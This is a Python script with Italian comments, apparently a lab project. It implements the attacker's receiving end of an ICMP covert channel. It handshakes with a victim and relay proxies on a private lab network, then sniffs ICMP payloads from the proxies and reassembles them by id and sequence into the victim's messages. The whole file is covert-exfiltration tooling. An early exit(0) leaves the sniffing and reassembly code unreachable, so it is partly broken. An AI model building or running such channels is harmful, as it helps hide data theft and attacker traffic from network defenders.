#L'attaccante riceve i messaggi da determinati indirizzi
#Ricevuti tutti, li unisce in un unico messaggio
from scapy.all import * #ICMP, IP, Raw, sniff
import string
import argparse
import mymethods
import threading

parser = argparse.ArgumentParser()
parser.add_argument("--ip_vittima",type=str, help="IP della vittima")
#parser.add_argument("--provaFlag",type=int, help="Comando da eseguire")
event = threading.Event()
proxyIP = [
    "192.168.56.101"
    ,"192.168.56.103"
    #,"192.168.56.1"
    #,"192.168.56.xxx"
] 
ip_vittima=None
sniffed_data=[]

def sanitize(stringa):
    stringa = ''.join(
        char if char in string.printable 
        else'' 
        for char in stringa
    ) 
    return stringa.strip() 

def analizza_pacchetto(packet):#ex packet_callback 
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
        # Print the source and destination IP addresses
        #print(f"Source: {packet[IP].src}, Destination: {packet[IP].dst}")
        #print(f"Raw Payload: {packetData}".format(packetData=sanitize(packet[Raw].load.decode( 'utf-8',errors='ignore'))) ) 
        id=packet[ICMP].id 
        seq=packet[ICMP].seq 
        return {
            "id":id, 
            "seq":seq, 
            "data":sanitize(packet[Raw].load.decode( 'utf-8',errors='ignore'))}
    else:
        print("Packet does not contain ICMP or IP layers.")
        print(packet.summary()) #Print the packet summary
        #packet.show() #Print the packet details

def packet_callback(packet):
    if packet.haslayer(Raw) and packet.haslayer(IP) and packet.haslayer(ICMP):
        #print(packet.summary())
        sniffed_data.append(packet)

sniff_args={
    "iface":"Ethernet 2", 
    "count":15,
    "filter":"icmp and (src host {ips})".format(ips="".join(
        proxyIP[index] if index==0 
        else " or "+proxyIP[index] 
        for index in range(len(proxyIP))
    )),
    "prn":packet_callback,
    #"store":True,
    "timeout": 60
}

def ricevi_Messaggi(args:dict):
    #iface: Specify the network interface to sniff on.
    #count: The number of packets to capture. If omitted, sniffing will continue until stopped.
    #filter: Apply a BPF (Berkeley Packet Filter) to capture only certain packets.
    #prn: Define a callback function to execute with each captured packet.
    #store: Whether to store sniffed packets or discard them.
    try:
        sniffed_packets = sniff(
            iface=args["iface"] 
                if ("iface" in args and args["iface"] is not None) 
                else None, 
            count=args["count"] 
                if ("count" in args and args["count"] is not None) 
                else None,
            filter=args["filter"] 
                if ("filter" in args and args["filter"] is not None) 
                else None,
            timeout=args["timeout"] 
                if ("timeout" in args and args["timeout"] is not None) 
                else None,
            prn=args["prn"]
                if ("prn" in args and args["prn"] is not None) 
                else None
        )
        #packets.summary()
    except KeyboardInterrupt:
        print("Sniffing stopped by user.") 
    if sniffed_packets is not None:
        return sniffed_packets
    else:
        return sniffed_data

def separa_dati_byID(dati):
    #I dati passati non sono i pacchetti ma i valori in Raw
    id_presenti=[]
    dati_separati=[] 
    for i in range(len(dati)):
        if dati[i]["id"] not in id_presenti:
            print("Nuovo ID trovato: {}".format(dati[i]["id"]))
            id_presenti.append(dati[i]["id"])
            dati_separati.append([])
            #print("ID presenti: {}".format(id_presenti))
        dati_separati[id_presenti.index(dati[i]["id"])].append(dati[i]) 
    #for i in range(len(dati_separati)):
        #print("Dati per ID {}: {}".format(id_presenti[i], dati_separati[i]))
        #print("\n") 
    return dati_separati

def unisciDati(dati):
    #indexSeg: index of the segment number in the data list
    #indexDati: index of the data in the data list
    #Si assume che i pacchetti hanno lo stesso ID 
    if len(dati)==0 or len(dati[0])<3:
        print("Dati non validi")
        return []
    seg=-1
    payload=[] 
    while seg<=len(dati):
        #print("Seg: ", seg)
        for i in range(len(dati)): 
            if dati[i]["seq"]==seg: 
                #print(dati[i][indexDati])
                payload.append(dati[i]["data"]) 
        seg+=1 
    return payload 

def conn_to_Vittima(ip_vittima):
    print(f"Connessione stabilita con {ip_vittima}")
    pkt = IP(dst=ip_vittima)/ICMP() / "".join(
        "__CONNECT__ "+proxyIP[index] if index==0 
        else ", "+proxyIP[index] 
        for index in range(len(proxyIP)
    ))
    ans = sr1(pkt, timeout=2, verbose=1)
    if ans:
        print(f"{ip_vittima} is alive")
        #ans.show()
    else:
        print(f"No reply: {ip_vittima} is not responding") 

packet_received_event = threading.Event()

def sniffer_timeout():
    global sniffer
    if not packet_received_event.is_set():
        print("Timeout: No packet received within 60 seconds")
        sniffer.stop() 
        event.set()

def callback_test_connection(packet):
    global timeout_timer
    print("Packet received: {}".format(packet.summary())) 
    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw): 
        if b'__CONNECT__' in bytes(packet[Raw].load): 
            packet_received_event.set()
            timeout_timer.cancel() 
            event.set()
        else:
            print(f"Il paccheto proviene da {packet[IP].src} ma non risponde alla connessione alla macchina") 

def test_connection(ip_dst):
    global sniffer, timeout_timer
    if ip_vittima is None:
        raise Exception("IP della vittima sconosciuto")
    
    print(f"Connessione con {ip_dst}...")
    pkt = IP(dst=ip_dst)/ICMP() / "".join( "__CONNECT__ {}".format(ip_vittima))
    ans = sr1(pkt, timeout=2, verbose=1)
    if ans:
        print(f"{ip_dst} is alive")
        #ans.show()
        try:
            sniffer= AsyncSniffer(
                filter=f"icmp and src {ip_dst}" 
                #,count=1 
                ,prn=callback_test_connection 
                #,store=True 
                ,iface=mymethods.iface_from_IP(ip_dst)[1] 
            ) 
            timeout_timer = threading.Timer(10, sniffer_timeout)
            sniffer.start()  
            timeout_timer.start()
            event.wait() 
            if not sniffer.running: 
                return False
            sniffer.stop()
            sniffer.join()
            return True
        except Exception as e:
            print(f"test_connection: {e}")
            return False
    print(f"{ip_dst} is not responding") 
    return False 

if __name__ == "__main__": 
    #1) l'attaccante si connettte prima con la vittima 
    args=mymethods.check_args(parser)
    if args.ip_vittima is None:
        print("Devi specificare l'IP della vittima con --ip_vittima")
        mymethods.supported_arguments(parser)
        exit(1) 
    ip_vittima=args.ip_vittima
    try: 
        proxyIP=[proxy for proxy in proxyIP if test_connection(proxy)]
        if len(proxyIP)<1:
            print("Nessun proxy presente. Prova a usare questa macchina")
            exit(0) 
    except Exception as e:
        print(f"Eccezione: {e}") 
        exit(1)
    exit(0)
    #2) l'attaccante riceve i messaggi da determinati indirizzi
    print("Inizio Sniffing...") 
    data=ricevi_Messaggi(sniff_args)
    print("Sniffing terminato.") 
    if data is None:
        print("Nessun dato ricevuto.")
        exit(1)
    #print("Dati ricevuti:")
    #for packet in data:
        #print(packet.summary())
    print(f"Totale pacchetti catturati: {len(data)}")
    print("Totale pacchetti ricevuti: {}\n".format(data)) 
    #print("Dati analizzati: \n", [analizza_pacchetto(packet) for packet in data])
    print("Separazione dati per ID...")
    dati_separati=separa_dati_byID([analizza_pacchetto(packet) for packet in data])
    print("Fine separazione dati...\n") 
    payload=[]
    for data in dati_separati:
        payload.append(unisciDati(data))
    print(payload)
